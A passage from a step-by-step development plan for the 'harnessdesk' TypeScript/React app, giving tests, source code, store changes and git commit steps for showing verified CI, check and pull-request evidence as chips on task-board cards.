    const runs = (...states: ('passed' | 'failed' | 'pending' | 'skipped' | 'cancelled')[]) => states.map((state) => ({ ...RUN, state }))
    expect(ciVerdict(runs('cancelled'))).toBe('cancelled')
    expect(ciVerdict(runs('passed', 'cancelled'))).toBe('cancelled')
    expect(ciVerdict(runs('cancelled', 'pending'))).toBe('cancelled')
    expect(ciVerdict(runs('failed', 'cancelled'))).toBe('failed')
    expect(ciVerdict(runs('passed', 'pending'))).toBe('running')
    expect(ciVerdict(runs('passed', 'skipped'))).toBe('passed')
    expect(ciVerdict(runs('skipped'))).toBe('skipped')
  })
})

describe("a card's chips", () => {
  it('a check running now stands in for that check’s last fact, and the rest keep their order', () => {
    const chips = cardChips(cardEvidence(3, [checkView({ exit: 1 }), prView('open')], [{ name: 'verify', since: 1 }]))
    expect(chips.map((one) => one.label)).toEqual(['verify running', 'PR #12 open'])
  })

  it('a card the desk observed nothing about has none', () => {
    expect(cardChips(undefined)).toEqual([])
    expect(cardChips(cardEvidence(1, []))).toEqual([])
  })
})

it('says who produced a fact, or that the desk did', () => {
  expect(byWords(checkView())).toBe('Scout on Alpha · alpha-max')
  expect(byWords(factView({ kind: 'diff', files: 1, added: 1, removed: 0, from: 'a'.repeat(40), to: 'b'.repeat(40) }, { by: null }))).toBe('The desk')
  expect(byWords(factView({ kind: 'diff', files: 1, added: 1, removed: 0, from: 'a'.repeat(40), to: 'b'.repeat(40) }, { by: { agent: null, seat: 'Beta · beta-pro' } }))).toBe('Beta · beta-pro')
})
```

2. Create `packages/ui/src/state/store.evidence.test.ts`:

```ts
import { beforeEach, expect, it, vi } from 'vitest'

import { type HostMethodName, type WireNotification } from '@harnessdesk/protocol'

import { EVIDENCE_BOARD, EVIDENCE_ROOM } from '../preview/evidence-fixture'
import { AppStore } from './store'

/*
 * What the desk observed, in the renderer: pushed whole, read on demand, and
 * never anything the renderer made up.
 */

let store: AppStore
let request: ReturnType<typeof vi.fn>

beforeEach(() => {
  store = new AppStore('ws://localhost:0/')
  request = vi.fn(async (method: HostMethodName) => (method === 'evidence/board' ? EVIDENCE_BOARD : null))
  vi.spyOn(store.transport, 'request').mockImplementation(request as never)
})

/** A notification, as the host pushes it. Never connected; nothing reaches a wire. */
const push = (notification: WireNotification): void => {
  const transport = store.transport as unknown as { handlers: { onNotification(notification: WireNotification): void } }
  transport.handlers.onNotification(notification)
}

it("a room's evidence arrives whole, replaces what was there, and goes with the room", () => {
  push({ method: 'evidence/changed', params: { room: EVIDENCE_ROOM, evidence: EVIDENCE_BOARD } })
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toBe(EVIDENCE_BOARD)

  const later = { ...EVIDENCE_BOARD, stamp: EVIDENCE_BOARD.stamp + 1, cards: [] }
  push({ method: 'evidence/changed', params: { room: EVIDENCE_ROOM, evidence: later } })
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toBe(later)

  push({ method: 'team/removed', params: { room: EVIDENCE_ROOM } })
  expect(store.getSnapshot().boardEvidence.has(EVIDENCE_ROOM)).toBe(false)
})

it('an answer older than what is drawn is dropped: a slow read never moves a card back', async () => {
  // A poll begins; before it answers, the host pushes a newer read — a check ended.
  let answer!: (evidence: unknown) => void
  request.mockImplementationOnce(() => new Promise((resolve) => (answer = resolve)))
  const polling = store.loadBoardEvidence(EVIDENCE_ROOM)
  const newer = { ...EVIDENCE_BOARD, stamp: EVIDENCE_BOARD.stamp + 10, cards: [] }
  push({ method: 'evidence/changed', params: { room: EVIDENCE_ROOM, evidence: newer } })
  // The poll answers late, with what it read before the push.
  answer(EVIDENCE_BOARD)
  await polling
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toBe(newer)
  // And a push that crossed a newer poll is dropped the same way.
  push({ method: 'evidence/changed', params: { room: EVIDENCE_ROOM, evidence: { ...EVIDENCE_BOARD, stamp: EVIDENCE_BOARD.stamp + 5 } } })
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toBe(newer)
})

it('a board reads its evidence when asked, and a read that fails leaves what was drawn', async () => {
  await store.loadBoardEvidence(EVIDENCE_ROOM)
  expect(request).toHaveBeenCalledWith('evidence/board', { room: EVIDENCE_ROOM })
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toEqual(EVIDENCE_BOARD)

  request.mockRejectedValueOnce(new Error('There is no room room-evidence on this desk.'))
  await store.loadBoardEvidence(EVIDENCE_ROOM)
  expect(store.getSnapshot().boardEvidence.get(EVIDENCE_ROOM)).toEqual(EVIDENCE_BOARD)
})
```

- [ ] **Step 4: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/evidence.test.ts src/state/store.evidence.test.ts`
Expected: FAIL — `Failed to resolve import "./evidence"`, and `store.loadBoardEvidence is not a function`.

- [ ] **Step 5: Facts in words**

Create `packages/ui/src/lib/evidence.ts`:

```ts
import type { CardEvidence, CheckRun, Evidence, EvidenceView, Freshness, Sha } from '@harnessdesk/protocol'

/**
 * What the desk observed, in words: a card's chips, and the lines of the
 * dialog a chip opens.
 *
 * Every word here is about a fact the host recorded from something it did — a
 * command it ran, a pull request it read, a diff it computed — and none is
 * about what an agent said: nothing here reads a message, a note or an
 * outcome. Only a current fact is ever drawn as a verdict. A stale one says how
 * far behind it is and is never green; an unknown one is drawn neutral, and
 * the dialog says why, because unknown is not zero.
 *
 * The tones are the design system's, not this file's: a chip names the
 * outcome in `stateTone`'s own states (`FactOutcome`), and `EvidenceChips`
 * asks `stateTone` for its tone. An outcome that map has no state for — CI
 * that was cancelled, a check that never started — is said in words, and
 * drawn neutral; no state is invented for it.
 */

/** A commit, as a person reads it: its first seven characters. */
export const shortSha = (sha: Sha): string => sha.slice(0, 7)

const plural = (n: number, noun: string): string => `${n} ${n === 1 ? noun : `${noun}s`}`

/** Behind, rewritten or run on uncommitted changes: drawn struck through, never green. */
export const isStale = (freshness: Freshness): boolean =>
  freshness.state === 'behind' || freshness.state === 'moved' || freshness.state === 'uncommitted'

/**
 * Whether a fact is still the answer to its question: fresh, or the last word
 * on a branch that is gone (`final` — a merged pull request, and only that).
 * Nothing else is ever a verdict.
 */
export const isCurrent = (freshness: Freshness): boolean => freshness.state === 'fresh' || freshness.state === 'final'

/** How a stale fact stands against its branch, short, for its chip; null for any fact that is not stale. */
export const sinceWords = (freshness: Freshness): string | null => {
  switch (freshness.state) {
    case 'behind':
      return `${plural(freshness.commits, 'commit')} since`
    case 'moved':
      return 'rewritten since'
    case 'uncommitted':
      return 'uncommitted'
    case 'fresh':
    case 'final':
    case 'unknown':
      return null
  }
}

/** The same, whole, for the dialog. Unknown says why. */
export const standingWords = (freshness: Freshness): string => {
  switch (freshness.state) {
    case 'fresh':
      return 'Fresh: nothing has landed on its branch since.'
    case 'final':
      return 'Final: the pull request was merged and its branch is gone, so nothing can land on it now.'
    case 'behind':
      return `Stale: ${plural(freshness.commits, 'commit')} landed on its branch since.`
    case 'moved':
      return 'Stale: its branch was rewritten since, and this commit is no longer on it.'
    case 'uncommitted':
      return 'Stale: it ran on changes that were never committed.'
    case 'unknown':
      return `Unknown: ${freshness.why}.`
  }
}

type CheckFact = Extract<Evidence, { kind: 'check' }>

/** A check passed when it exited 0 by itself. */
export const checkPassed = (fact: CheckFact): boolean => fact.exit === 0 && !fact.timedOut

/** What a check did, in a sentence. */
export const checkWords = (fact: CheckFact): string =>
  fact.timedOut
    ? 'It ran past its time and was stopped.'
    : fact.exit === null
      ? 'It did not start.'
      : `It exited ${fact.exit}.`

/** What the forge's checks on one head say together. */
export type CiVerdict = 'passed' | 'failed' | 'cancelled' | 'running' | 'skipped'

/**
 * What the forge's checks on one head say together: any failure is a failure;
 * then any cancelled check — which never said whether the work is good, and
 * is not a pass however the rest went; then any still running; then passed
 * when one passed; else every one was skipped.
 */
export const ciVerdict = (checks: readonly CheckRun[]): CiVerdict => {
  if (checks.some((one) => one.state === 'failed')) return 'failed'
  if (checks.some((one) => one.state === 'cancelled')) return 'cancelled'
  if (checks.some((one) => one.state === 'pending')) return 'running'
  return checks.some((one) => one.state === 'passed') ? 'passed' : 'skipped'
}

/** The revision a fact is bound to; null for one bound to none. */
export const revisionOfFact = (fact: Evidence): Sha | null => {
  switch (fact.kind) {
    case 'check':
    case 'ci':
    case 'review':
    case 'finding':
      return fact.at
    case 'pr':
      return fact.head
    case 'diff':
      return fact.to
    case 'spend':
      return null
  }
}

/** Who produced a fact, in words. */
export const byWords = (view: EvidenceView): string =>
  view.by === null ? 'The desk' : view.by.agent === null ? view.by.seat : `${view.by.agent} on ${view.by.seat}`

/**
 * An outcome in the design system's own states — each one `stateTone` has a
 * word and a tone for. Written out rather than imported so this file stays
 * free of the renderer; `EvidenceChips` holds it to `StateToneState`, so a
 * state the system does not have cannot be written here.
 */
export type FactOutcome = 'open' | 'merged' | 'closed' | 'passed' | 'failed' | 'running' | 'skipped' | 'timed out'

export interface FactChip {
  /** One chip per kind on a card, and one per named check. */
  readonly key: string
  readonly label: string
  /** The outcome it reports, in `stateTone`'s states; null when it reports none the system can judge in a word. */
  readonly outcome: FactOutcome | null
  /** It no longer holds: struck through, and never green. */
  readonly stale: boolean
  /** Nobody can say whether it holds: drawn neutral, and the dialog says why. */
  readonly unknown: boolean
}

/** What a chip says to a screen reader: its words, and what its look says without them. */
export const spokenChip = (chip: FactChip): string =>
  `${chip.label}${chip.stale ? ' (stale)' : ''}${chip.unknown ? ' (unknown)' : ''}`

/**
 * A check's words: *verify ✓ @a1b2c3d*. The mark is a word of the label, read
 * with it, so it is written inside the sentence rather than standing alone
 * as an icon would.
 */
const checkLabel = (fact: CheckFact): string => {
  const at = `@${shortSha(fact.at)}`
  if (fact.timedOut) return `${fact.name} timed out ${at}`
  if (fact.exit === null) return `${fact.name} did not start ${at}`
  return fact.exit === 0 ? `${fact.name} ✓ ${at}` : `${fact.name} ✗ ${at}`
}

/** A check's outcome: passed, failed or timed out — and none for one that never started, which is said in words. */
const checkOutcome = (fact: CheckFact): FactOutcome | null =>
  fact.timedOut ? 'timed out' : fact.exit === null ? null : fact.exit === 0 ? 'passed' : 'failed'

/** What the forge's checks say together, in the chip's words. */
const ciLabel = (verdict: CiVerdict): string =>
  verdict === 'passed' ? 'CI ✓' : verdict === 'failed' ? 'CI ✗' : `CI ${verdict}`

/**
 * What one fact says on its card: *verify ✓ @a1b2c3d*, *CI ✓*, *PR #12 open*,
 * *+120 −30 in 6 files*. A stale fact adds how far behind it is — *verify ✓
 * @a1b2c3d — 2 commits since* — and is drawn struck through; an unknown one is
 * drawn neutral. Both are the design system `Chip`'s own `stale` and
 * `unknown`, never a colour chosen here.
 */
export const chipOf = (view: EvidenceView): FactChip => {
  const fact = view.record.fact
  const since = sinceWords(view.freshness)
  const said = (base: string): string => (since ? `${base} — ${since}` : base)
  const stale = isStale(view.freshness)
  const unknown = view.freshness.state === 'unknown'
  const chip = (key: string, label: string, outcome: FactOutcome | null): FactChip => ({ key, label: said(label), outcome, stale, unknown })
  switch (fact.kind) {
    case 'check':
      return chip(`check:${fact.name}`, checkLabel(fact), checkOutcome(fact))
    case 'ci': {
      const verdict = ciVerdict(fact.checks)
      return chip('ci', ciLabel(verdict), verdict === 'cancelled' ? null : verdict)
    }
    case 'pr':
      return chip('pr', `PR #${fact.number} ${fact.state}`, fact.state)
    case 'diff':
      return chip('diff', `+${fact.added} −${fact.removed} in ${plural(fact.files, 'file')}`, null)
    case 'review':
      return chip(`review:${fact.by}`, `review: ${fact.verdict}`, null)
    case 'finding':
      return chip(`finding:${fact.id}`, `finding ${fact.state}`, null)
    case 'spend':
      return { key: 'spend', label: `$${fact.usd.toFixed(2)} in ${plural(fact.turns, 'turn')}`, outcome: null, stale: false, unknown: false }
  }
}

/**
 * A card's chips: a check running now in place of that check's last fact,
 * then every other fact in the order the host lists them. Empty for a card
 * the desk has observed nothing about.
 */
export const cardChips = (card: CardEvidence | undefined): readonly FactChip[] => {
  if (!card) return []
  const running = new Set(card.running.map((one) => one.name))
  return [
    ...card.running.map((one): FactChip => ({
      key: `check:${one.name}`,
      label: `${one.name} running`,
      outcome: 'running',
      stale: false,
      unknown: false,
    })),
    ...card.facts
      .filter((view) => !(view.record.fact.kind === 'check' && running.has(view.record.fact.name)))
      .map(chipOf),
  ]
}
```

The check mark is written inside each label's template (`${fact.name} ✓ ${at}`), never as a string of its own: `Icons.test.tsx` refuses a glyph standing alone in quotes, because that is an icon drawn as text — and here the mark is a word of the chip, read with it.

- [ ] **Step 6: The snapshot and the store**

1. In `packages/ui/src/state/snapshot.ts`, add `BoardEvidence,` to the type import from `@harnessdesk/protocol`; after the `readonly flowRuns: …` field add:

```ts
  /**
   * What the desk observed on each room's cards, keyed by room: the latest
   * fact of each kind per card, how each stands against its branch now, and
   * the checks the room's project names. Beside the board for the reason flow
   * runs are: a board is what the cards are, and this is what is known about
   * them. Pushed whole by the host on every change (`evidence/changed`) and
   * read when a board is shown; a room the desk has observed nothing for has
   * an entry with no cards.
   */
  readonly boardEvidence: ReadonlyMap<string, BoardEvidence>
```

   and in `EMPTY`, after `flowRuns: new Map(),`, add `boardEvidence: new Map(),`.

2. In `packages/ui/src/state/store.ts`:
   - Add `type BoardEvidence,` to the import from `@harnessdesk/protocol`.
   - Directly after the `if (notification.method === 'flow/changed') { … }` block, add:

```ts
        if (notification.method === 'evidence/changed') {
          // Whole, for the reason the board is: a new fact can move a card to another column.
          const { room, evidence } = notification.params
          this.#keepBoardEvidence(room, evidence)
        }
```

   - In the `if (notification.method === 'team/removed') { … }` block, replace its `this.#patch({ teams })` with:

```ts
          // What was observed on its cards goes with the room: nothing draws it any more.
          const boardEvidence = new Map(this.#snapshot.boardEvidence)
          boardEvidence.delete(room)
          this.#patch({ teams, boardEvidence })
```

   - After `loadFlowRuns`, add:

```ts

  // ------------------------------------------------------------------ evidence

  /**
   * A room's evidence, read now: when its board is shown, when the window comes
   * back to the front, and every thirty seconds while the board is on screen.
   * Staleness is read, not watched — a commit landing on a card's branch tells
   * the desk nothing until something asks, and phase 9 brings the watcher.
   * Everything the desk itself records arrives on its own, as
   * `evidence/changed`.
   */
  async loadBoardEvidence(room: string): Promise<void> {
    try {
      this.#keepBoardEvidence(room, (await this.transport.request('evidence/board', { room })) as BoardEvidence)
    } catch {
      // A room the host no longer has is a room with nothing observed to draw.
    }
  }

  /**
   * A room's evidence, kept only when it is newer than what is drawn. A read
   * and a push can cross — a poll that began before a check ended can answer
   * after the push that told of its fact — so each answer carries the host's
   * stamp for when its read began, and one older than what is drawn is
   * dropped rather than moving a card back to where it was.
   */
  #keepBoardEvidence(room: string, evidence: BoardEvidence): void {
    const drawn = this.#snapshot.boardEvidence.get(room)
    if (drawn && drawn.stamp > evidence.stamp) return
    const boardEvidence = new Map(this.#snapshot.boardEvidence)
    boardEvidence.set(room, evidence)
    this.#patch({ boardEvidence })
  }
```

3. In `script/check-reachable.mjs`, delete the `'evidence/board': …` line from `UNREACHED`: `loadBoardEvidence` is its caller.

- [ ] **Step 7: The preview's evidence room**

In `packages/ui/src/preview/harness.tsx`:
- Add, after the `./sidebar-fixture` import:

```ts
import { EVIDENCE_BOARD, EVIDENCE_ROOM, EVIDENCE_TEAM } from './evidence-fixture'
```

- In the seed's `teams` map, after `[EDGE_ROOM, EDGE_TEAM],`, add `[EVIDENCE_ROOM, EVIDENCE_TEAM],`, and after the `teams: new Map([ … ]),` entry add:

```ts
      /* What the desk observed on the evidence room's cards: every column the
         facts make, a stale chip, a check running, and a card whose agent said
         the tests pass with nothing observed. */
      boardEvidence: new Map([[EVIDENCE_ROOM, EVIDENCE_BOARD]]),
```

- In `class PreviewStore`, directly above `// --- the team verbs, against the fixture`, add:

```ts
  // --- what the desk observed, against the fixture --------------------------
  /* Already in the snapshot; a read changes nothing. */
  loadBoardEvidence = async (): Promise<void> => {}

```

No surface draws this yet; Task 16 adds the board frame.

- [ ] **Step 8: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/evidence.test.ts src/state/store.evidence.test.ts`
Expected: PASS — 8 and 3 tests.

- [ ] **Step 9: Prove the tests can fail**

1. In `chipOf`, change `const stale = isStale(view.freshness)` to `const stale = false`: `a stale fact says how far behind it is, and is marked stale for the chip to strike through` fails. Restore it.
2. In `isStale`, add `|| freshness.state === 'unknown'`: `an unknown fact is not stale and not a verdict…` fails. Restore it.
3. In `ciVerdict`, delete the `cancelled` line: `a failure first; then a cancelled check, which is never a pass; then one still running` fails, and so does the chip test on `CI cancelled`. Restore it.
4. In `chipOf`'s `ci` case, pass `verdict` as the outcome for a cancelled CI too: the build fails — `'cancelled'` is not a `FactOutcome`, which holds only the states `stateTone` has. Restore it.
5. In `#keepBoardEvidence`, delete `if (drawn && drawn.stamp > evidence.stamp) return`: `an answer older than what is drawn is dropped: a slow read never moves a card back` fails. Restore it.
6. Delete the `evidence/changed` branch in `store.ts`: `a room's evidence arrives whole…` fails. Restore it.

- [ ] **Step 10: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
node script/design-audit.mjs --strict
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/lib/evidence.ts packages/ui/src/lib/evidence.test.ts packages/ui/src/preview/evidence-fixture.ts packages/ui/src/state/snapshot.ts packages/ui/src/state/store.ts packages/ui/src/state/store.evidence.test.ts packages/ui/src/preview/harness.tsx script/check-reachable.mjs
git commit -m "feat(evidence): what the desk observed, in the renderer's state and words

A room's evidence is pushed whole and read on demand, kept beside its board
— the newest by the host's stamp, so a late answer never moves a card back —
and put into words in one place: verify ✓ @a1b2c3d, CI ✓, PR #12 open,
+120 −30 in 6 files. A chip names its outcome only in the design system's
states; cancelled CI is its own verdict, never a pass. A stale fact says how
far behind it is and is struck through; an unknown one is neutral, and the
dialog says why. The preview gains a room whose cards stand in every column
the facts make.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: the audit's findings unchanged, and `verify exit: 0` before the commit.

---

### Task 16: A card's evidence, drawn

> **Prerequisite:** `4382ded9` from `claude/ui-roles` — cherry-pick it, or the roles PR once it is on main. This task uses `Chip`'s `tone`, `stale` and `unknown`, and `stateTone`.

A card carries its evidence as chips in its foot — *verify ✓ @a1b2c3d*, *CI ✓*, *PR #12 open*, *+120 −30 in 6 files*, and *verify running* while a check runs — pressed as one row that opens *What the desk observed*: every fact on the card with when it was observed, at which commit, by which Seat, and how it stands now, a failed check's output, the forge's checks, and the pull request, which opens. A card the desk observed nothing about draws nothing. The board reads its evidence when it is shown, when the window comes back to the front, and every thirty seconds while it is on screen.

**Files:**
- Create: `packages/ui/src/components/EvidenceChips.tsx`
- Modify: `packages/ui/src/components/TeamBoardPane.tsx` (the board reads its evidence; each card's foot draws it)
- Modify: `packages/ui/src/preview/main.tsx` (the evidence board's frame; *what was observed* on the dialog dial)
- Test: `packages/ui/src/components/EvidenceChips.test.tsx` (new)
- Test, named edits: `packages/ui/src/components/TeamBoardPane.test.tsx` — the shared `rig` gains an `evidence` argument (what `evidence/board` answers, seeded into the snapshot) and a `loadBoardEvidence` stand-in, and five tests are appended; `packages/ui/src/components/TeamRoomPane.test.tsx` — its store gains `loadBoardEvidence`, because the room draws the board and the board now reads its evidence

**Proof needs:** the rendered UI

**Interfaces:**
- Consumes: `cardChips`, `chipOf`, `byWords`, `checkWords`, `revisionOfFact`, `shortSha`, `standingWords` (Task 15); `AppStore.loadBoardEvidence`, `AppSnapshot.boardEvidence` (Task 15); `Chip` with `tone`, `stale` and `unknown`, and `stateTone` (`4382ded9`); `spokenChip`, `type FactChip` (Task 15); `Button`, `CodeText`, `Dialog`, `EmptyState`, `KeyValue`, `KeyValueRow`, `Note`, `StatePill` (`../design`); `openExternal` (`lib/desktop.ts`).
- Produces: `EvidenceChips({ id, title, card })`; `ObservedDialog({ id, title, card, onClose })`.

- [ ] **Step 1: Confirm the design system's state vocabulary**

Run: `grep -n "export type ChipProps\|stale?: boolean\|unknown?: boolean" packages/ui/src/design/patterns/Settings.tsx; grep -n "export const stateTone\|'timed out'" packages/ui/src/design/patterns/PublicationCard.tsx; grep -n "derived" packages/ui/src/design/ui/board.tsx; grep -n "aria-describedby" packages/ui/src/design/patterns/Menu.tsx`
Expected: `ChipProps` — a union, `{ state: Readiness; tone?: never } | { state?: never; tone: Tone }`, with `stale?: boolean` and `unknown?: boolean`; `stateTone` exported, with `'timed out'` among its states; `Board` takes `derived`; `MenuItem` ties its reason with `aria-describedby`. If any differs, stop and report — this plan composes that API and does not extend it.

- [ ] **Step 2: Write the failing tests**

1. Create `packages/ui/src/components/EvidenceChips.test.tsx`:

```tsx
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, expect, it, vi } from 'vitest'

import { cardEvidence, checkView, ciView, prView } from '../preview/evidence-fixture'
import { StoreProvider } from '../state/context'
import { emptySnapshot, type AppSnapshot, type AppStore } from '../state/store'
import { EvidenceChips, ObservedDialog } from './EvidenceChips'

/*
 * A card's evidence: chips that open everything the desk observed on it, and
 * nothing at all for a card it observed nothing about.
 */

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
  vi.restoreAllMocks()
})

const store = {
  subscribe: () => () => {},
  getSnapshot: () => ({ ...emptySnapshot(), status: 'open' }) as AppSnapshot,
} as unknown as AppStore

const mount = async (node: React.ReactNode): Promise<void> => {
  await act(async () => {
    root.render(<StoreProvider store={store}>{node}</StoreProvider>)
  })
}

it('a card the desk observed nothing about draws nothing', async () => {
  await mount(<EvidenceChips id={1} title="Retry on a 502" card={undefined} />)
  expect(container.innerHTML).toBe('')
  await mount(<EvidenceChips id={1} title="Retry on a 502" card={cardEvidence(1, [])} />)
  expect(container.innerHTML).toBe('')
})

it('every fact whole: what a failed check printed, the forge’s checks, and the pull request, which opens', async () => {
  const opened = vi.spyOn(window, 'open').mockReturnValue(null)
  const card = cardEvidence(1, [
    checkView({ exit: 1, tail: 'FAIL retry.test.ts > retries a 502\n1 failed' }),
    ciView(['passed', 'failed']),
    prView('open'),
  ])
  await mount(<ObservedDialog id={1} title="Retry on a 502" card={card} onClose={() => {}} />)

  const dialog = document.querySelector('[role="dialog"]')
  expect(dialog?.textContent).toContain('verify ✗ @a1b2c3d')
  expect(dialog?.textContent).toContain('It exited 1.')
  expect(dialog?.querySelector('pre')?.textContent).toBe('FAIL retry.test.ts > retries a 502\n1 failed')
  expect(dialog?.textContent).toContain('build: passed · lint: failed')
  const open = [...(dialog?.querySelectorAll('button') ?? [])].find((one) => one.textContent === 'Open pull request #12')
  act(() => open?.click())
  expect(opened).toHaveBeenCalledWith('https://example.com/storefront/pull/12', '_blank', 'noopener,noreferrer')
})

it('a check still running is said, and a card with nothing observed yet says what would be', async () => {
  await mount(<ObservedDialog id={3} title="Cover both" card={cardEvidence(3, [], [{ name: 'verify', since: 1 }])} onClose={() => {}} />)
  const dialog = document.querySelector('[role="dialog"]')
  expect(dialog?.textContent).toContain('verify is running')
  expect(dialog?.textContent).toContain('Nothing observed yet')
  expect(dialog?.textContent).toContain('Nothing an agent says is recorded here.')
})

it("each chip's tone is the one the state map gives its outcome, and stale and unknown are the Chip's own", async () => {
  const card = cardEvidence(
    1,
    [
      checkView(),
      checkView({ name: 'lint', freshness: { state: 'behind', commits: 2 } }),
      ciView(['passed', 'cancelled']),
      prView('merged', { freshness: { state: 'unknown', why: 'its checkout is gone' } }),
    ],
    [{ name: 'e2e', since: 1 }],
  )
  await mount(<EvidenceChips id={1} title="Retry on a 502" card={card} />)
  const chips = [...container.querySelectorAll<HTMLElement>('[data-slot="chip-words"]')].map((words) => {
    const chip = words.parentElement as HTMLElement
    return [words.textContent, chip.dataset['tone'], 'stale' in chip.dataset, 'unknown' in chip.dataset]
  })
  expect(chips).toEqual([
    ['e2e running', 'info', false, false],
    ['verify ✓ @a1b2c3d', 'success', false, false],
    // Stale: struck through, and never green, whatever it said.
    ['lint ✓ @a1b2c3d — 2 commits since', 'neutral', true, false],
    // Cancelled is no state the system judges: said in words, neutral.
    ['CI cancelled', 'neutral', false, false],
    // Unknown: neutral, whatever it was.
    ['PR #12 merged', 'neutral', false, true],
  ])
  expect(container.querySelector('button')?.getAttribute('aria-label')).toBe(
    'What the desk observed on #1: e2e running, verify ✓ @a1b2c3d, lint ✓ @a1b2c3d — 2 commits since (stale), CI cancelled, PR #12 merged (unknown)',
  )
})
```

2. In `packages/ui/src/components/TeamBoardPane.test.tsx`:
   - Add `type BoardEvidence,` to the import from `@harnessdesk/protocol`, and `import { cardEvidence, checkView, prView } from '../preview/evidence-fixture'` after the `../design` import.
   - Change the `rig` signature and its comment to:

```tsx
/* `extra` carries the parts of the board state a test needs to vary — the
   nicknames, so far, because who holds a card is a property of the board and
   there is no other way to write that case. `evidence` is what the desk
   observed on the board's cards, as `evidence/board` answers. */
const rig = (intents: readonly unknown[], extra: Partial<TeamState> = {}, evidence?: BoardEvidence) => {
```

   - In its snapshot, after `teams: new Map([[ROOM, state(intents, extra)]]),`, add `boardEvidence: new Map(evidence ? [[ROOM, evidence]] : []),`; and in its store, after `loadFlowRuns: …,`, add:

```tsx
    /* Read when the board is shown; what it would answer is `evidence` above,
       already in the snapshot. */
    loadBoardEvidence: vi.fn().mockResolvedValue(undefined),
```

   - Append:

```tsx
/**
 * What the desk observed, on the card it was observed for.
 *
 * Chips, pressed as one row that opens every fact whole. Nothing here is drawn
 * from what anybody said: a board with no evidence draws none of it, however
 * loudly the channel says the tests pass.
 */
const observed = (checks: readonly string[], cards: BoardEvidence['cards']): BoardEvidence => ({
  room: ROOM,
  stamp: 1,
  checks,
  refused: [],
  unreadable: null,
  cards,
})

const chipsOf = (id: number): HTMLButtonElement | null =>
  container.querySelector<HTMLButtonElement>(`button[aria-label^="What the desk observed on #${id}"]`)

it('a card carries what the desk observed as chips, and they open all of it', async () => {
  const { store } = rig(
    [intent({ state: 'claimed', claim: { runtime: 'codex', sessionId: 'c1', at: 1 } })],
    {},
    observed(['verify'], [cardEvidence(1, [checkView(), prView('open')])]),
  )
  await render(store)

  const chips = chipsOf(1)
  expect(chips?.textContent).toContain('verify ✓ @a1b2c3d')
  expect(chips?.textContent).toContain('PR #12 open')
  act(() => chips?.click())
  await act(async () => {})

  const dialog = document.querySelector('[role="dialog"]')
  expect(dialog?.textContent).toContain('What the desk observed on #1')
  expect(dialog?.textContent).toContain('Scout on Alpha · alpha-max')
  expect(dialog?.textContent).toContain('Fresh: nothing has landed on its branch since.')
  expect(dialog?.textContent).toContain('pnpm verify')
})

it('a stale chip says how far behind it is', async () => {
  const { store } = rig(
    [intent({ state: 'claimed', claim: { runtime: 'codex', sessionId: 'c1', at: 1 } })],
    {},
    observed(['verify'], [cardEvidence(1, [checkView({ freshness: { state: 'behind', commits: 2 } })])]),
  )
  await render(store)
  expect(chipsOf(1)?.textContent).toBe('verify ✓ @a1b2c3d — 2 commits since (stale)')
  expect(chipsOf(1)?.getAttribute('aria-label')).toBe('What the desk observed on #1: verify ✓ @a1b2c3d — 2 commits since (stale)')
})

it('the plain board draws no evidence', async () => {
  const { store } = rig([intent({ state: 'open' })])
  await render(store)
  expect(chipsOf(1)).toBeNull()
  expect(store.loadBoardEvidence).toHaveBeenCalledWith(ROOM)
})

it('a message between agents is never evidence: the channel saying the tests pass draws no chip', async () => {
  const said = {
    id: 'm1',
    at: 1,
    kind: 'message',
    from: { kind: 'agent', runtime: 'codex', sessionId: 'c1', title: 'API migration' },
    to: { runtime: 'claude', sessionId: 'k1', title: 'Auth refactor' },
    text: 'verify passed, all tests pass — ready to merge',
    state: 'delivered',
  }
  const { store } = rig(
    [intent({ state: 'done', note: 'All tests pass.' })],
    { channel: [said] } as unknown as Partial<TeamState>,
    observed(['verify'], []),
  )
  await render(store)
  expect(chipsOf(1)).toBeNull()
  expect(card('Migrate auth callers').textContent).not.toContain('✓')
})

it('reads what was observed when shown, when the window comes back, and every thirty seconds', async () => {
  vi.useFakeTimers({ toFake: ['setInterval', 'clearInterval'] })
  try {
    const { store } = rig([intent({ state: 'open' })])
    await render(store)
    expect(store.loadBoardEvidence).toHaveBeenCalledTimes(1)
    act(() => {
      window.dispatchEvent(new Event('focus'))
    })
    expect(store.loadBoardEvidence).toHaveBeenCalledTimes(2)
    act(() => {
      vi.advanceTimersByTime(30_000)
    })
    expect(store.loadBoardEvidence).toHaveBeenCalledTimes(3)
  } finally {
    vi.useRealTimers()
  }
})
```

3. In `packages/ui/src/components/TeamRoomPane.test.tsx`, in the rig's store, after `loadFlowRuns: vi.fn().mockResolvedValue(undefined),`, add:

```tsx
    /* And nothing observed on its cards: the board reads it when it is shown. */
    loadBoardEvidence: vi.fn().mockResolvedValue(undefined),
```

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/EvidenceChips.test.tsx src/components/TeamBoardPane.test.tsx`
Expected: FAIL — `Failed to resolve import "./EvidenceChips"`, and in `TeamBoardPane.test.tsx` the five new tests (no chips; `loadBoardEvidence` never called).

- [ ] **Step 4: The chips, and what they open**

Create `packages/ui/src/components/EvidenceChips.tsx`:

```tsx
import { useState } from 'react'

import type { CardEvidence, EvidenceView } from '@harnessdesk/protocol'

import { Button, Chip, CodeText, Dialog, EmptyState, KeyValue, KeyValueRow, Note, StatePill, stateTone } from '../design'
import { openExternal } from '../lib/desktop'
import {
  byWords,
  cardChips,
  checkWords,
  chipOf,
  revisionOfFact,
  shortSha,
